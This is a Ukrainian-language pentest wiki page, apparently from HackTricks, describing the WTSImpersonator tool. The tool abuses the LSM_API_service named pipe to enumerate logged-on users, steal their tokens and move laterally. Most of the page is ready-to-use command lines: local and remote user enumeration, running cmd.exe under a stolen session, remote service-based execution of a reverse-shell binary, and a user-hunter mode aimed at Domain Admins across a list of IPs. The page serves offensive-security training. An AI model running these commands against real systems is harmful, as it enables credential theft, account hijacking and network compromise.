# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Інструмент **WTS Impersonator** використовує RPC Named pipe **"\\pipe\LSM_API_service"**, щоб приховано перелічувати користувачів, які увійшли в систему, і викрадати їхні токени, обходячи традиційні методи Token Impersonation. Цей підхід забезпечує безперешкодне lateral movements у мережах. Авторство цієї інноваційної техніки належить **Omri Baso; його робота доступна на [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Основна функціональність

Інструмент працює через послідовність API calls:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Основні модулі та використання

- **Enumerating Users**: за допомогою інструмента можливе локальне та віддалене перерахування користувачів із використанням команд для кожного сценарію:

- Локально:
```bash
.\WTSImpersonator.exe -m enum
```
- Віддалено, із зазначенням IP-адреси або hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: для роботи модулів `exec` і `exec-remote` потрібен контекст **Service**. Для локального виконання потрібні лише виконуваний файл WTSImpersonator і команда:

- Приклад локального виконання команди:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Для отримання контексту service можна використати PsExec64.exe:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: передбачає віддалене створення та встановлення service подібно до PsExec.exe, що дає змогу виконувати команди за наявності відповідних дозволів.

- Приклад віддаленого виконання:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: націлений на конкретних користувачів на кількох машинах і виконує код з використанням їхніх облікових даних. Це особливо корисно для атак на Domain Admins, які мають локальні права адміністратора в кількох системах.
- Приклад використання:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
